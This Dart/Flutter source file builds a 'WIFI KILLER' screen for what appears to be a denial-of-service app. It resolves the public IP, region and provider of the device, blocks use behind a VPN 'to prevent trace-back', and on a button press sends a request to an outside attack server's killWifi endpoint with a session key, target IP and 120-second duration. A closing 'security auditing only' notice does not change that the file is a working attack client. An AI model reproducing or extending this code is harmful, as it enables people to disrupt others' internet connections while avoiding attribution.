import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> with TickerProviderStateMixin {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  // Theme Colors (Purple Glassmorphism)
  final Color bgBlack = const Color(0xFF08080E);
  final Color accentPurple = const Color(0xFF7B2CBF);
  final Color lightPurple = const Color(0xFF9D4EDD);
  final Color glassBorder = Colors.white.withOpacity(0.1);
  final Color glassBg = Colors.white.withOpacity(0.05);

  late AnimationController _scanController;
  late AnimationController _pulseController;

  @override
  void initState() {
    super.initState();
    _scanController = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat();
    _pulseController = AnimationController(vsync: this, duration: const Duration(seconds: 1))..repeat(reverse: true);
    _loadPublicInfo();
  }

  @override
  void dispose() {
    _scanController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  Future<void> _loadPublicInfo() async {
    setState(() => isLoading = true);
    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ip = jsonDecode(ipRes.body)['ip'];

      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") || asnRaw.contains("cloud") || asnRaw.contains("aws");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() => isLoading = false);
    }
  }

  Future<void> _attackTarget() async {
    HapticFeedback.heavyImpact();
    setState(() => isAttacking = true);
    final url = Uri.parse("http://kingkyaz.veyoradev.biz.id:4002/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      _showAlert(res.statusCode == 200 ? "✅ SUCCESS" : "❌ FAILED",
          res.statusCode == 200 ? "Attack packet dispatched to $publicIp" : "Server rejected request.");
    } catch (e) {
      _showAlert("ERROR", "Connection failed.");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: AlertDialog(
          backgroundColor: bgBlack.withOpacity(0.8),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: glassBorder)),
          title: Text(title, style: TextStyle(color: lightPurple, fontFamily: 'Orbitron', fontSize: 18)),
          content: Text(message, style: const TextStyle(color: Colors.white70)),
          actions: [
            TextButton(onPressed: () => Navigator.pop(context), child: Text("CLOSE", style: TextStyle(color: lightPurple))),
          ],
        ),
      ),
    );
  }

  Widget _buildGlassContainer({required Widget child, EdgeInsetsGeometry? padding}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(24),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: Container(
          padding: padding,
          decoration: BoxDecoration(
            color: glassBg,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: glassBorder),
          ),
          child: child,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgBlack,
      body: Stack(
        children: [
          // Background Glows
          Positioned(top: -50, right: -50, child: _buildGlowOrb(250, accentPurple.withOpacity(0.15))),
          Positioned(bottom: -50, left: -50, child: _buildGlowOrb(200, lightPurple.withOpacity(0.1))),

          SafeArea(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 20),
              child: Column(
                children: [
                  const SizedBox(height: 20),
                  // Header
                  _buildHeader(),
                  const SizedBox(height: 30),

                  Expanded(
                    child: isLoading ? _buildLoadingView() : _buildMainContent(),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Row(
      children: [
        IconButton(
          onPressed: () => Navigator.pop(context),
          icon: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 20),
        ),
        Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text("WIFI KILLER", style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
            Text("External Disruption Suite", style: TextStyle(color: lightPurple.withOpacity(0.5), fontSize: 11, letterSpacing: 1.2)),
          ],
        ),
        const Spacer(),
        _buildStatusDot(),
      ],
    );
  }

  Widget _buildStatusDot() {
    return Container(
      width: 10, height: 10,
      decoration: BoxDecoration(
        color: isAttacking ? Colors.redAccent : (isVpn ? Colors.amber : Colors.greenAccent),
        shape: BoxShape.circle,
        boxShadow: [BoxShadow(color: isAttacking ? Colors.red : Colors.greenAccent, blurRadius: 10)],
      ),
    );
  }

  Widget _buildMainContent() {
    return SingleChildScrollView(
      physics: const BouncingScrollPhysics(),
      child: Column(
        children: [
          _buildGlassContainer(
            padding: const EdgeInsets.all(20),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text("TARGET METADATA", style: TextStyle(color: Colors.white38, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 2)),
                const SizedBox(height: 20),
                _infoRow("IP Address", publicIp, Icons.public),
                _infoRow("Region", region, Icons.location_on),
                _infoRow("ASN / Provider", asn, Icons.dns),
                _infoRow("VPN Shield", isVpn ? "DETECTED" : "UNSHIELDED", Icons.security,
                    color: isVpn ? Colors.redAccent : Colors.greenAccent),
              ],
            ),
          ),
          const SizedBox(height: 30),

          if (isVpn) _buildVpnWarning(),

          const SizedBox(height: 10),

          // Attack Button
          if (!isVpn)
            GestureDetector(
              onTap: isAttacking ? null : _attackTarget,
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 300),
                height: 65,
                decoration: BoxDecoration(
                  gradient: isAttacking
                      ? LinearGradient(colors: [Colors.grey.shade800, Colors.grey.shade900])
                      : LinearGradient(colors: [accentPurple, lightPurple]),
                  borderRadius: BorderRadius.circular(20),
                  boxShadow: [
                    if(!isAttacking) BoxShadow(color: accentPurple.withOpacity(0.3), blurRadius: 15, offset: const Offset(0, 8))
                  ],
                ),
                child: Center(
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      if(isAttacking) const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2)),
                      if(!isAttacking) const Icon(Icons.bolt, color: Colors.white),
                      const SizedBox(width: 12),
                      Text(
                        isAttacking ? "EXECUTING ATTACK..." : "INITIATE TERMINATION",
                        style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1.2),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          const SizedBox(height: 20),
          _buildNotice(),
        ],
      ),
    );
  }

  Widget _buildLoadingView() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          RotationTransition(
            turns: _scanController,
            child: Container(
              width: 100, height: 100,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: lightPurple.withOpacity(0.2), width: 2),
                gradient: SweepGradient(colors: [Colors.transparent, lightPurple.withOpacity(0.5), Colors.transparent]),
              ),
            ),
          ),
          const SizedBox(height: 24),
          Text("RESOLVING TARGET...", style: TextStyle(color: lightPurple, letterSpacing: 2, fontSize: 12)),
        ],
      ),
    );
  }

  Widget _buildVpnWarning() {
    return _buildGlassContainer(
      padding: const EdgeInsets.all(15),
      child: const Row(
        children: [
          Icon(Icons.warning_amber_rounded, color: Colors.redAccent),
          SizedBox(width: 15),
          Expanded(child: Text("Proxy/VPN Detected. Attack blocked to prevent trace-back.", style: TextStyle(color: Colors.redAccent, fontSize: 12))),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value, IconData icon, {Color? color}) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 15),
      child: Row(
        children: [
          Icon(icon, color: lightPurple.withOpacity(0.5), size: 18),
          const SizedBox(width: 15),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(label, style: const TextStyle(color: Colors.white24, fontSize: 10)),
              Text(value, style: TextStyle(color: color ?? Colors.white, fontSize: 14, fontWeight: FontWeight.w600, fontFamily: 'monospace')),
            ],
          )
        ],
      ),
    );
  }

  Widget _buildNotice() {
    return Text(
      "Attack Duration: 120s\nUse this tool for security auditing only.",
      textAlign: TextAlign.center,
      style: TextStyle(color: Colors.white10, fontSize: 10, letterSpacing: 1),
    );
  }

  Widget _buildGlowOrb(double size, Color color) {
    return Container(
      width: size, height: size,
      decoration: BoxDecoration(shape: BoxShape.circle, color: color, boxShadow: [BoxShadow(color: color, blurRadius: 100, spreadRadius: 40)]),
    );
  }
}